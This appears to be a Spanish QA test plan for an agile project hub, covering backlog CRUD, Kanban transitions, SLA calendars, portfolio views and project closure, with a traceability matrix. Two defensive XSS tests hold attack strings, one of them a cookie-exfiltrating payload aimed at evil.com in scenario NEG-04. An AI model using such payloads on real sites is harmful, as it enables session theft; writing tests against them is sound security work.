# Journey J-06: Hub Ágil — Planificación, Ejecución Kanban y Gobernanza SLA

> **Journey:** J-06 — Certificación del Ciclo Ágil Completo
> **Actor principal:** Scrum Master / Líder de Proyecto + Operario Ejecutor
> **Criticidad:** 🟠 ALTA (US-030 es la US más completa del lote ~85%, US-008 es Scaffolding ~10%)
> **US Cruzadas:** US-030, US-008, US-043, US-001
> **Épicas:** Motor Core (Épica A) + Seguridad/Config (Épica E)
> **Fecha:** 2026-04-19
> **Autor:** Agente PO (Antigravity)
> **Formato:** Híbrido (Manual paso-a-paso + links a `.spec.ts`)
> **Enfoque PO:** Certificar el flujo completo de vida ágil: creación → planificación → ejecución → archivado

---

## Narrativa del Journey

Este Journey certifica el ciclo de vida completo de un Proyecto Ágil: desde la instanciación del proyecto por un Scrum Master (Pantalla 9), pasando por la planificación del Backlog en el Hub Ágil (Pantalla 10), la ejecución operativa en el Tablero Kanban (Pantalla 3), hasta el cierre formal del proyecto con cascada de cancelación. Se valida la interacción entre 4 US y la coherencia entre las vistas de planificación y ejecución.

```
┌───────────────────────────────────────────────────────────────────────────────┐
│ FASE 1: Instanciación del Proyecto Ágil (US-030 CA-1, CA-2)                  │
│ FASE 2: CRUD del Backlog — Inyección y Gestión de Tarjetas (US-030 CA-3–6)   │
│ FASE 3: Ejecución Kanban — Movimiento de Tarjetas (US-008 CA-1–8)            │
│ FASE 4: SLA y Temporización — Gobernanza Temporal (US-043, US-030 CA-9)      │
│ FASE 5: Vistas Consolidadas y Portafolio (US-030 CA-7, CA-12–14)             │
│ FASE 6: Cierre y Archivado — Fin del Proyecto (US-030 CA-8, CA-10)           │
└───────────────────────────────────────────────────────────────────────────────┘
```

---

## Precondiciones

| # | Precondición | Verificación | US Origen |
|---|-------------|-------------|-----------|
| PRE-1 | Tenant `tenant_alpha` configurado con calendario corporativo Lun-Vie 8:00-17:00 | BD: `ibpms_business_calendar` con registros | US-043 |
| PRE-2 | Usuario `scrum@alpha.com` con rol `Scrum_Master` | JWT con roles efectivos | US-036 |
| PRE-3 | Usuario `dev@alpha.com` con rol `Ejecutor` (operario regular) | JWT con roles efectivos | US-036 |
| PRE-4 | Usuario `lider@alpha.com` con rol `Lider_Proyecto` | JWT con roles efectivos | US-036 |
| PRE-5 | API de festivos gubernamentales disponible (o fallback manual) | Health check 200 o grid manual poblado | US-043 |
| PRE-6 | Workdesk (Pantalla 1) operativo para verificar propagación | US-001 certificada | US-001 |

---

## FASE 1: Instanciación del Proyecto Ágil

### CU-J06-01: Creación de Proyecto Ágil — Arranque Vacío
**CA Mapeado:** US-030 CA-1, US-030 CA-2 (opción 1)
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | Navega a Pantalla 9 (Gestor de Proyectos) y presiona [+ Nuevo Proyecto] | Modal/Wizard de creación visible |
| 2 | Scrum Master | Selecciona metodología "Ágil" | Sistema presenta Pop-Up con 2 opciones: "Iniciar vacío" / "Usar Plantilla WBS" |
| 3 | Scrum Master | Selecciona "Iniciar vacío" | — |
| 4 | Scrum Master | Completa: Título="Proyecto ERP Alpha", Descripción, Fecha inicio | — |
| 5 | Scrum Master | Presiona [Crear Proyecto] | HTTP 201 Created. Proyecto registrado en BD |
| 6 | Sistema | Redirige a Pantalla 10 (Hub Ágil) | Backlog vacío. Mensaje: "No hay tareas. Pulse [+ Nueva Tarea] para comenzar" |
| 7 | Verificación | Pantalla 10 muestra modo Kanban Continuo (sin Sprints) | NO aparecen iteraciones con fechas. Flujo continuo TODO→DONE (CA-1) |
**Automatización:** `e2e/specs/j-06/project-creation-empty.spec.ts`

### CU-J06-02: Creación de Proyecto Ágil — Plantilla WBS Bloqueada
**CA Mapeado:** US-030 CA-2 (opción 2)
**Estado esperado:** ⚠️ PARCIAL (US-006 no implementada → opción deshabilitada)
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | En Pop-Up de creación, observa opción "Usar Plantilla WBS" | Opción visible pero **deshabilitada** (gris) con tooltip: "Requiere módulo de Plantillas (US-006)" |
| 2 | Scrum Master | Intenta hacer clic en la opción deshabilitada | Sin efecto. No se permite seleccionar |
| 3 | Verificación | Solo "Iniciar vacío" es operativa en V1 | UI consistente con la ausencia de US-006 |
**Automatización:** `e2e/specs/j-06/project-creation-wbs-blocked.spec.ts`

---

## FASE 2: CRUD del Backlog — Inyección y Gestión de Tarjetas

### CU-J06-03: Inyección Manual de Tarjeta con Slide-Panel Completo
**CA Mapeado:** US-030 CA-3
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | Presiona [+ Nueva Tarea] en la barra superior del Hub Ágil | Slide-Panel lateral se desliza desde la derecha |
| 2 | Scrum Master | Completa campos obligatorios: **Título**="Configurar módulo ERP", **Descripción**="Integrar Oracle NetSuite con el módulo financiero" | Campos renderizados correctamente |
| 3 | Scrum Master | Completa campos opcionales: **Esfuerzo**=8h, **Responsable**=dev@alpha.com, **Tag**="Backend" (color azul), **Notas**="Prioridad sprint actual" | Multi-select de responsables filtra solo miembros del proyecto |
| 4 | Scrum Master | En campo Descripción, pega imagen desde portapapeles (Ctrl+V) | Imagen embebida en editor rich-text. Sin errores |
| 5 | Scrum Master | En campo Descripción, intenta inyectar `<script>alert('XSS')</script>` | Texto sanitizado: script eliminado por DOMPurify |
| 6 | Scrum Master | Presiona [Guardar Tarea] | HTTP 201 Created. Tarjeta visible en backlog en posición superior |
| 7 | Verificación | La tarjeta aparece inmediatamente en Pantalla 3 (Kanban) en columna TODO | Propagación cross-pantalla confirmada |
| 8 | Verificación | La tarjeta en Pantalla 1 (Workdesk) de `dev@alpha.com` | Tarea visible en bandeja "Mis Tareas" del operario asignado |
**Automatización:** `e2e/specs/j-06/task-creation-slide-panel.spec.ts`

### CU-J06-04: Edición de Tarjeta en Cualquier Estado
**CA Mapeado:** US-030 CA-3 (edición)
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | Hace clic en tarjeta "Configurar módulo ERP" en el backlog | Slide-Panel se abre con datos pre-cargados |
| 2 | Scrum Master | Modifica Título a "Configurar módulo ERP — Sprint 2" | — |
| 3 | Scrum Master | Modifica Esfuerzo de 8h a 12h | — |
| 4 | Scrum Master | Presiona [Guardar Cambios] | HTTP 200 OK. Cambios reflejados en backlog, Kanban y Workdesk |
| 5 | Verificación | Título actualizado visible en las 3 pantallas (10, 3, 1) | Consistencia cross-vista |
**Automatización:** `e2e/specs/j-06/task-edit-any-state.spec.ts`

### CU-J06-05: Eliminación Física con Auditoría Forense
**CA Mapeado:** US-030 CA-4
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | Presiona icono 🗑️ sobre la tarjeta "Tarea Obsoleta" | Diálogo de confirmación: "¿Eliminar permanentemente 'Tarea Obsoleta'? Esta acción no se puede deshacer" |
| 2 | Scrum Master | Presiona [Confirmar Eliminación] | HTTP 200 OK. Tarjeta desaparece del backlog |
| 3 | Verificación | BD: `ibpms_agile_tasks WHERE id = {task_id}` | Registro eliminado (Hard-Delete) |
| 4 | Verificación | BD: `ibpms_audit_log WHERE action = 'TASK_DELETED'` | Registro inmutable: ID, Título, usuario, timestamp |
| 5 | Verificación | Pantalla 3 (Kanban) | Tarjeta eliminada ya no visible |
| 6 | Verificación | Pantalla 1 (Workdesk) del operario | Tarea eliminada desaparece de la bandeja |
**Automatización:** `e2e/specs/j-06/task-delete-with-audit.spec.ts`

### CU-J06-06: Asignación Flexible Multi-Persona (Planificación) y 1:1 (Ejecución)
**CA Mapeado:** US-030 CA-5, US-008 CA-4
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | Abre tarjeta "Diseñar API REST" en Hub Ágil (Pantalla 10) | — |
| 2 | Scrum Master | Asigna 3 responsables: dev@alpha.com, ana@alpha.com, carlos@alpha.com | Multi-select acepta 3 usuarios. Todos miembros activos del proyecto |
| 3 | Verificación (Hub) | Panel de detalle muestra 3 avatares/nombres | Visible para visibilidad gerencial |
| 4 | dev@alpha.com | Abre Pantalla 3 (Kanban) y reclama la tarjeta | Solo dev@alpha.com queda como ejecutor activo (1:1) |
| 5 | ana@alpha.com | Intenta reclamar la misma tarjeta en Pantalla 3 | HTTP 409 Conflict: "Tarea ya reclamada por otro miembro del equipo" |
| 6 | Verificación | En Workdesk (Pantalla 1) de dev@alpha.com | Tarea aparece en "Mis Tareas" |
| 7 | Verificación | En Workdesk de ana@alpha.com | Tarea NO aparece (no es la ejecutora) |
**Automatización:** `e2e/specs/j-06/multi-assignee-planning-vs-execution.spec.ts`

### CU-J06-07: Priorización Visual por Drag & Drop
**CA Mapeado:** US-030 CA-6
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | Ve lista de 5 tarjetas en Hub Ágil: T1, T2, T3, T4, T5 (de arriba a abajo) | — |
| 2 | Scrum Master | Arrastra T4 de posición 4 a posición 1 (más urgente) | — |
| 3 | Verificación UI | Nueva ordenación: T4, T1, T2, T3, T5 | Visual confirmado |
| 4 | Verificación BD | `SELECT position FROM ibpms_agile_tasks WHERE project_id = X ORDER BY position` | Valores de posición coherentes con el nuevo orden |
| 5 | Scrum Master | Recarga la página (F5) | Orden preservado: T4, T1, T2, T3, T5 |
| 6 | Verificación | Otro usuario abre el mismo Hub Ágil | Ve el mismo orden persistido |
**Automatización:** `e2e/specs/j-06/drag-drop-prioritization.spec.ts`

---

## FASE 3: Ejecución Kanban — Movimiento de Tarjetas

### CU-J06-08: Transición de Estado con Propagación WebSocket
**CA Mapeado:** US-008 CA-6 (State Machine), US-008 (Propagación WebSocket)
**Estado esperado:** ❌ DEBE FALLAR (US-008 ~10% scaffolding — KanbanView usa mocks)
| Paso | Actor | Acción | Resultado Esperado (POST-PARCHE) |
|:----:|-------|--------|----------------------------------|
| 1 | Operario (dev@alpha.com) | Abre Pantalla 3 (Kanban) del proyecto "ERP Alpha" | Tablero con columnas TODO, DOING, DONE |
| 2 | Operario | Arrastra tarjeta "Configurar módulo ERP" de TODO a DOING | `PATCH /api/v1/projects/kanban/tasks/KT-XXX/status` → `{new_status: "DOING"}` |
| 3 | Sistema | Responde HTTP 200 con objeto completo | `{id: "KT-XXX", status: "DOING", version: 2}` |
| 4 | Sistema | Propaga evento vía WebSocket | Scrum Master en otra pestaña ve la tarjeta moverse a DOING en tiempo real |
| 5 | Verificación BD | `updated_at` actualizado en `ibpms_kanban_tasks` | Timestamp refrescado |
| 6 | Verificación | Hub Ágil (Pantalla 10) del Scrum Master | Estado de la tarjeta refleja "DOING" (reactividad cruzada CA-14 US-030) |
**Resultado actual (sin parche):** ⚠️ `KanbanView.vue` usa `setTimeout` + datos hardcodeados. El `PATCH` no existe. Sin WebSocket.
**Automatización:** `e2e/specs/j-06/kanban-state-transition-websocket.spec.ts`

### CU-J06-09: Bloqueo Modal Obligatorio al Mover a "Blocked"
**CA Mapeado:** US-008 CA-1
**Estado esperado:** ❌ DEBE FALLAR (endpoint no existe)
| Paso | Actor | Acción | Resultado Esperado (POST-PARCHE) |
|:----:|-------|--------|----------------------------------|
| 1 | Operario | Arrastra tarjeta de DOING a columna BLOCKED | — |
| 2 | Sistema | Levanta Modal obligatorio: "Ingrese el motivo del bloqueo" | — |
| 3 | Operario | Escribe: "Esperando respuesta del equipo legal sobre contrato de licencia" | — |
| 4 | Operario | Presiona [Confirmar Bloqueo] | HTTP 200. Tarjeta en columna BLOCKED con badge 🚧 |
| 5 | Verificación | SLA de la tarea | Reloj de SLA sigue corriendo (NO se congela — diseño intencional CA-1) |
| 6 | Verificación | BD: `block_reason` | Motivo persistido con timestamp y usuario |
**Resultado actual (sin parche):** ⚠️ Sin endpoint de transición con `blockReason`. Sin modal en KanbanView.
**Automatización:** `e2e/specs/j-06/kanban-blocked-modal.spec.ts`

### CU-J06-10: Inmutabilidad de Formularios en DONE
**CA Mapeado:** US-008 CA-2
**Estado esperado:** ❌ DEBE FALLAR (sin validación de estado DONE)
| Paso | Actor | Acción | Resultado Esperado (POST-PARCHE) |
|:----:|-------|--------|----------------------------------|
| 1 | Operario | Arrastra tarjeta a columna DONE (habiendo completado formulario) | HTTP 200. Tarjeta en DONE |
| 2 | Operario | Intenta abrir el formulario asociado para modificar datos | — |
| 3 | Sistema | Renderiza formulario en modo **Solo Lectura** absoluto | Todos los campos deshabilitados. Sin botón [Enviar] |
| 4 | Pentester | Intenta `POST /api/v1/workbox/tasks/{id}/complete` directamente | **HTTP 400**: "Tarea en estado DONE no acepta modificaciones" |
| 5 | Verificación | BD: datos del formulario | Intactos, sin alteración |
**Automatización:** `e2e/specs/j-06/kanban-done-readonly.spec.ts`

### CU-J06-11: Gobernanza de Columnas Dinámicas con Límite Rígido
**CA Mapeado:** US-008 CA-8
**Estado esperado:** ❌ DEBE FALLAR (sin endpoint de columnas)
| Paso | Actor | Acción | Resultado Esperado (POST-PARCHE) |
|:----:|-------|--------|----------------------------------|
| 1 | Scrum Master | Presiona [+ Añadir Columna] en Pantalla 3 | Modal: "Nombre de la nueva columna" |
| 2 | Scrum Master | Escribe "QA Review" y presiona [Crear] | Columna QA REVIEW aparece entre DOING y DONE |
| 3 | Scrum Master | Repite 4 veces más: "Code Review", "Staging", "UAT", "Pre-Prod" | 7 columnas totales (TODO + 5 nuevas + DONE) |
| 4 | Scrum Master | Intenta crear columna #8 | **Sistema rechaza**: "Máximo de 7 columnas alcanzado para V1" |
| 5 | Operario (dev@alpha.com) | Intenta agregar una columna | **HTTP 403**: Solo `Scrum_Master` o `Lider_Proyecto` pueden modificar columnas |
**Automatización:** `e2e/specs/j-06/kanban-dynamic-columns-limit.spec.ts`

---

## FASE 4: SLA y Temporización — Gobernanza Temporal

### CU-J06-12: SLA con Calendario Corporativo — Pausa Fin de Semana
**CA Mapeado:** US-043 CA-1
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | Crea tarjeta con SLA=4 horas. Fecha de creación: Viernes 16:00 | — |
| 2 | Sistema | Custom BusinessCalendar pausa el cronómetro a las 17:00 (fin de jornada) | 1 hora SLA consumida |
| 3 | Fin de semana | Sábado y Domingo no cuentan | SLA pausado: 3 horas restantes |
| 4 | Lunes 8:00 | Cronómetro reanuda | — |
| 5 | Lunes 11:00 | 3 horas más consumidas (total: 4h) | SLA VENCIDO a las 11:00 AM del Lunes |
| 6 | Verificación | Semáforo SLA en Pantalla 1 (Workdesk) y Pantalla 3 (Kanban) | 🔴 Rojo — SLA excedido. Consistente con BusinessCalendar |
**Automatización:** `e2e/specs/j-06/sla-business-calendar-weekend.spec.ts`

### CU-J06-13: SLA — Exención de Timers Sistémicos
**CA Mapeado:** US-043 CA-2
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Arquitecto BPMN | Configura Timer Event con `camunda:property name="isBusinessSla" value="false"` | Timer marcado como sistémico |
| 2 | Sistema | Timer programado para Domingo 3:00 AM (job de conciliación) | — |
| 3 | Domingo 3:00 AM | Timer se dispara | Timer NO fue pausado por el BusinessCalendar |
| 4 | Verificación | Job de conciliación ejecutado en hora exacta | Sin retrasos por fin de semana |
**Automatización:** `e2e/specs/j-06/sla-system-timer-exemption.spec.ts`

### CU-J06-14: Modificación de SLA Individual con Bitácora de Cambios
**CA Mapeado:** US-030 CA-9
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Líder de Proyecto | Abre detalle de tarjeta "Diseñar API REST" con SLA original=24h | — |
| 2 | Líder de Proyecto | Modifica SLA a 48h en el campo "Tiempo Límite" | — |
| 3 | Líder de Proyecto | Presiona [Guardar] | HTTP 200 OK |
| 4 | Verificación BD | `ibpms_agile_sla_changelog` | `{old: "24h", new: "48h", changed_by: "lider@alpha.com", changed_at: "2026-04-19T10:30:00Z"}` |
| 5 | Verificación UI | Panel de detalle muestra bitácora visible | Historial: "Cambio de 24h a 48h por lider@alpha.com el 19/04/2026 10:30" |
| 6 | Verificación | Reloj SLA de la tarjeta ajustado | Semáforo recalculado con nuevo umbral |
**Automatización:** `e2e/specs/j-06/sla-modification-changelog.spec.ts`

### CU-J06-15: Alerta Preventiva al 80% del SLA
**CA Mapeado:** US-043 CA-6
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Sistema | Tarea con SLA=10h alcanza las 8h consumidas (80%) | — |
| 2 | Motor SLA | Dispara alerta automática | — |
| 3 | Operario asignado | Recibe notificación (bell icon) | "⚠️ Alerta SLA: La tarea 'Configurar módulo ERP' tiene 2 horas restantes" |
| 4 | Verificación UI | Semáforo SLA cambia a 🟡 Amarillo (80% threshold) | Visual coherente con US-001 CA-24 |
| 5 | Verificación | Si SLA configurado con umbral personalizado (US-001 CA-24) | Los umbrales del tenant `tenant_alpha` aplican |
**Automatización:** `e2e/specs/j-06/sla-early-warning-80pct.spec.ts`

### CU-J06-16: Timer de Esfuerzo Independiente (Play/Stop) por Estado
**CA Mapeado:** US-008 CA-3
**Estado esperado:** ❌ DEBE FALLAR (sin tabla `ibpms_time_logs`, sin `<UniversalSlaTimer>`)
| Paso | Actor | Acción | Resultado Esperado (POST-PARCHE) |
|:----:|-------|--------|----------------------------------|
| 1 | Operario | Tarjeta en TODO | Timer de esfuerzo **oculto y bloqueado** |
| 2 | Operario | Arrastra tarjeta a DOING | Timer de esfuerzo **habilitado**: botón [▶ Play] visible |
| 3 | Operario | Presiona [▶ Play] | Cronómetro inicia: 00:00:01, 00:00:02... |
| 4 | Operario | Después de 2h, presiona [⏸ Stop] | Timer pausado: 02:00:00 acumuladas |
| 5 | Operario | Arrastra tarjeta a BLOCKED | Timer **sigue disponible** (cobrar tiempo de desbloqueo) |
| 6 | Operario | Arrastra tarjeta a DONE | Timer **bloqueado y apagado** definitivamente. Total: 02:00:00 sellado |
| 7 | Verificación BD | `ibpms_time_logs WHERE reference_type='TASK_AGILE'` | Registro inmutable con esfuerzo acumulado |
| 8 | Operario | Intenta editar el registro de 2h a 1h | **HTTP 405**: Append-Only. Correcciones solo vía asiento negativo (CA-11 US-008) |
**Automatización:** `e2e/specs/j-06/timer-effort-by-state.spec.ts`

---

## FASE 5: Vistas Consolidadas y Portafolio

### CU-J06-17: Vista Proyecto vs Vista Portafolio
**CA Mapeado:** US-030 CA-7
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Líder de Proyecto | Abre Pantalla 10 (Hub Ágil) | Vista por defecto: "Vista Proyecto" con tarjetas del proyecto actual |
| 2 | Líder de Proyecto | Cambia selector a "Vista Portafolio" | — |
| 3 | Sistema | Consolida tarjetas de TODOS los proyectos Ágiles activos del Líder | Tarjetas agrupadas por proyecto (headers: "Proyecto ERP Alpha", "Proyecto CRM Beta", etc.) |
| 4 | Verificación | Filtro por `leaderId` aplicado | Solo proyectos donde `lider@alpha.com` es Líder o Scrum Master |
| 5 | Líder | Vuelve a "Vista Proyecto" y selecciona "ERP Alpha" | Solo tarjetas de ERP Alpha visibles |
**Automatización:** `e2e/specs/j-06/portfolio-view-toggle.spec.ts`

### CU-J06-18: Anatomía Visual del Backlog Moderno con Virtual Scrolling
**CA Mapeado:** US-030 CA-12
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | Crea 200 tarjetas en el proyecto (o usa seed data) | — |
| 2 | Scrum Master | Abre Hub Ágil (Pantalla 10) | Lista vertical estilo Jira/Linear (no columnas Kanban) |
| 3 | Verificación UI | Cada fila muestra: Título, Responsable(s), Etiqueta con color, Estado actual | Anatomía completa renderizada |
| 4 | Verificación Performance | Scroll infinito con virtualización | Solo ~20 filas en DOM real. Sin congelamiento del navegador |
| 5 | Scrum Master | Usa filtro por Estado: "DOING" | Solo tarjetas en progreso visibles |
| 6 | Scrum Master | Usa filtro por Asignado: "dev@alpha.com" | Solo tarjetas del operario filtradas |
| 7 | Scrum Master | Presiona "Saltar al Tablero →" (esquina superior derecha) | Navegación instantánea a Pantalla 3 del mismo proyecto |
| 8 | Verificación | Tags con colores personalizados | Tags "Backend" (azul), "Frontend" (verde), "Urgente" (rojo) — creados ad-hoc |
**Automatización:** `e2e/specs/j-06/backlog-virtual-scrolling-filters.spec.ts`

### CU-J06-19: Carga Liviana con Lazy Loading de Detalles
**CA Mapeado:** US-030 CA-14
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Líder | Abre Hub Ágil con 100 tarjetas | — |
| 2 | Verificación Network | Inspeccionar payload del GET inicial | Solo campos ligeros: ID, Título, Estado, Asignado, Etiqueta. SIN Descripción/Notas |
| 3 | Líder | Hace clic en tarjeta individual | — |
| 4 | Verificación Network | Request adicional `GET /tasks/{id}` | Retorna campos pesados: Descripción completa, Notas, historial SLA |
| 5 | Verificación | Tiempo de carga inicial < 2 segundos con 100 tarjetas | Performance aceptable |
**Automatización:** `e2e/specs/j-06/lazy-loading-task-details.spec.ts`

---

## FASE 6: Cierre y Archivado — Fin del Proyecto

### CU-J06-20: Archivo Inteligente de Tareas DONE
**CA Mapeado:** US-030 CA-8
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Operario | Completa 3 tarjetas (pasan a DONE en Pantalla 3) | — |
| 2 | Scrum Master | Abre Hub Ágil (Pantalla 10) | Las 3 tarjetas DONE están **ocultas** del backlog principal |
| 3 | Scrum Master | Activa toggle "Mostrar Completadas" | Sección plegable al final: "3 tareas completadas" |
| 4 | Scrum Master | Expande la sección | Ve las 3 tarjetas con estado DONE y datos de completado |
| 5 | Scrum Master | Desactiva toggle | Tarjetas DONE se ocultan nuevamente |
**Automatización:** `e2e/specs/j-06/archive-done-toggle.spec.ts`

### CU-J06-21: Cierre de Proyecto con Cascada Controlada de Cancelación
**CA Mapeado:** US-030 CA-10
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Líder de Proyecto | Proyecto "ERP Alpha" tiene: 3 tareas DONE, 2 en DOING, 4 en TODO | — |
| 2 | Líder | Navega a Pantalla 9 y presiona [Terminar Proyecto] | Diálogo: "¿Cerrar el proyecto? 6 tareas activas serán canceladas" |
| 3 | Líder | Confirma cierre | HTTP 200 OK |
| 4 | Verificación BD | `ibpms_agile_tasks WHERE project_id = X AND status != 'DONE'` | Todas marcadas como `CANCELADA` |
| 5 | Verificación BD | `ibpms_projects WHERE id = X` | Estado: `CERRADO`. Modo solo-lectura |
| 6 | Verificación Workdesk | Operarios asignados a tareas DOING/TODO | Tareas desaparecen de sus bandejas |
| 7 | Verificación Kanban | Pantalla 3 del proyecto | Banner: "Proyecto cerrado — Solo lectura". Sin opciones de arrastre |
| 8 | Verificación Hub | Pantalla 10 del proyecto | Datos visibles pero sin opciones de edición, creación o eliminación |
| 9 | Verificación | Evento de notificación enviado a todos los operarios | Notificación: "El proyecto 'ERP Alpha' ha sido cerrado por lider@alpha.com" |
**Automatización:** `e2e/specs/j-06/project-closure-cascade.spec.ts`

### CU-J06-22: Seguridad — Solo Scrum Master/Líder pueden Crear y Eliminar
**CA Mapeado:** US-030 CA-11
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Operario (dev@alpha.com, rol Ejecutor) | Intenta `POST /api/v1/agile/projects/{pid}/tasks` | **HTTP 403 Forbidden** |
| 2 | Operario | Intenta `DELETE /api/v1/agile/projects/{pid}/tasks/{tid}` | **HTTP 403 Forbidden** |
| 3 | Operario | Abre Hub Ágil Pantalla 10 | Ve tarjetas en modo **solo lectura**. Sin botón [+ Nueva Tarea]. Sin icono 🗑️ |
| 4 | Scrum Master | Mismos endpoints | HTTP 201 / HTTP 200 — acceso concedido |
**Automatización:** `e2e/specs/j-06/rbac-scrum-master-only.spec.ts`

---

## Escenarios Negativos

### CU-J06-NEG-01: Límite Rígido de 500 Tarjetas Activas por Proyecto
**CA Mapeado:** US-030 CA-11
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | Proyecto tiene 499 tarjetas activas (no DONE ni CANCELADA) | — |
| 2 | Scrum Master | Crea tarjeta #500 | HTTP 201 OK — límite alcanzado |
| 3 | Scrum Master | Intenta crear tarjeta #501 | **HTTP 429**: "Límite de 500 tarjetas activas alcanzado. Archive o elimine tareas para continuar" |
| 4 | Scrum Master | Archiva 5 tarjetas (pasa a DONE) | Contador: 495 activas |
| 5 | Scrum Master | Crea tarjeta #501 (ahora la 496) | HTTP 201 OK — espacio liberado |

### CU-J06-NEG-02: Operaciones Masivas limitadas a 50 Tareas por Petición
**CA Mapeado:** US-030 CA-11
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | Selecciona 51 tarjetas para asignación masiva (bulk assign) | — |
| 2 | Scrum Master | Presiona [Asignar a dev@alpha.com] | **HTTP 400**: "Máximo 50 tareas por operación masiva" |
| 3 | Scrum Master | Selecciona 50 tarjetas y repite | HTTP 200 OK — 50 tarjetas asignadas en una sola petición |

### CU-J06-NEG-03: Detección Visual de Tareas Abandonadas (15 días)
**CA Mapeado:** US-030 CA-13
**Estado esperado:** ❌ DEBE FALLAR (badge "Inactivo X días" no evidenciado)
| Paso | Actor | Acción | Resultado Esperado (POST-PARCHE) |
|:----:|-------|--------|----------------------------------|
| 1 | Sistema | Tarjeta "Tarea Olvidada" sin actividad por 20 días | — |
| 2 | Scrum Master | Abre Hub Ágil | — |
| 3 | Verificación UI | Tarjeta "Tarea Olvidada" | Borde izquierdo ámbar/naranja + Badge: "🕐 Inactivo 20 días" |
| 4 | Operario | Edita la tarjeta (cualquier cambio) | Indicador de abandono desaparece |

### CU-J06-NEG-04: XSS en Descripción Rich-Text
**CA Mapeado:** US-030 CA-11 (sanitización)
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Scrum Master | Crea tarjeta con Descripción: `<img src=x onerror="fetch('http://evil.com?c='+document.cookie)">` | — |
| 2 | Backend | Sanitiza al persistir | Texto plano: `<img src=x>` sin handler de eventos |
| 3 | Otro usuario | Abre la tarjeta | Sin ejecución de script. Sin exfiltración de cookies |

### CU-J06-NEG-05: Recálculo Retroactivo Asíncrono de SLA (Anti-Deadlock)
**CA Mapeado:** US-043 CA-3
| Paso | Actor | Acción | Resultado Esperado |
|:----:|-------|--------|-------------------|
| 1 | Administrador | Cambia horas hábiles de 17:00 a 16:30 | — |
| 2 | Administrador | Activa toggle "Aplicar Retroactivamente a Tareas Vivas" | — |
| 3 | Administrador | Presiona [Aplicar Matriz] | HTTP 202 Accepted (NO síncrono) |
| 4 | Sistema | Encola Job Batch asíncrono | Modal: "Recálculo masivo en progreso. Los SLAs se actualizarán gradualmente" |
| 5 | Verificaciones | Tareas vivas actualizadas en minutos (batch) | Sin deadlocks ni timeouts |

---

## Matriz de Trazabilidad

| Escenario | US Principal | CAs Cubiertos | Fase | Estado Esperado |
|-----------|:-----------:|:------------:|:----:|:--------------:|
| CU-J06-01 | US-030 | CA-1, CA-2 | Instanciación | ✅ PASA |
| CU-J06-02 | US-030 | CA-2 | Instanciación | ⚠️ PARCIAL (WBS bloqueado) |
| CU-J06-03 | US-030 | CA-3 | CRUD | ✅ PASA |
| CU-J06-04 | US-030 | CA-3 | CRUD | ✅ PASA |
| CU-J06-05 | US-030 | CA-4 | CRUD | ✅ PASA |
| CU-J06-06 | US-030/008 | CA-5, CA-4 | CRUD | ⚠️ PARCIAL |
| CU-J06-07 | US-030 | CA-6 | CRUD | ✅ PASA |
| CU-J06-08 | US-008 | CA-6 | Kanban | ❌ FALLA |
| CU-J06-09 | US-008 | CA-1 | Kanban | ❌ FALLA |
| CU-J06-10 | US-008 | CA-2 | Kanban | ❌ FALLA |
| CU-J06-11 | US-008 | CA-8 | Kanban | ❌ FALLA |
| CU-J06-12 | US-043 | CA-1 | SLA | ✅ PASA |
| CU-J06-13 | US-043 | CA-2 | SLA | ✅ PASA |
| CU-J06-14 | US-030 | CA-9 | SLA | ✅ PASA |
| CU-J06-15 | US-043 | CA-6 | SLA | ⚠️ PARCIAL (deuda CA-6) |
| CU-J06-16 | US-008 | CA-3, CA-9, CA-10, CA-11 | SLA | ❌ FALLA |
| CU-J06-17 | US-030 | CA-7 | Vistas | ✅ PASA |
| CU-J06-18 | US-030 | CA-12 | Vistas | ✅ PASA |
| CU-J06-19 | US-030 | CA-14 | Vistas | ✅ PASA |
| CU-J06-20 | US-030 | CA-8 | Cierre | ✅ PASA |
| CU-J06-21 | US-030 | CA-10 | Cierre | ✅ PASA |
| CU-J06-22 | US-030 | CA-11 | Cierre | ✅ PASA |
| CU-J06-NEG-01 | US-030 | CA-11 | Negativo | ✅ PASA |
| CU-J06-NEG-02 | US-030 | CA-11 | Negativo | ✅ PASA |
| CU-J06-NEG-03 | US-030 | CA-13 | Negativo | ❌ FALLA |
| CU-J06-NEG-04 | US-030 | CA-11 | Negativo | ✅ PASA |
| CU-J06-NEG-05 | US-043 | CA-3 | Negativo | ✅ PASA |

---

## Resumen de Cobertura J-06

| US | CAs Cubiertos | Total CAs US | % Cubierto en J-06 |
|----|:------------:|:----------:|:-------------------:|
| US-030 | CA-1 a CA-14 | 14 | **100%** |
| US-008 | CA-1, CA-2, CA-3, CA-4, CA-6, CA-8, CA-9, CA-10, CA-11 | 11 | **82%** |
| US-043 | CA-1, CA-2, CA-3, CA-6 | 6 | **67%** |
| US-001 | (validación cruzada Workdesk) | — | N/A |

---

## Brechas Críticas Descubiertas (Pre-Ejecución)

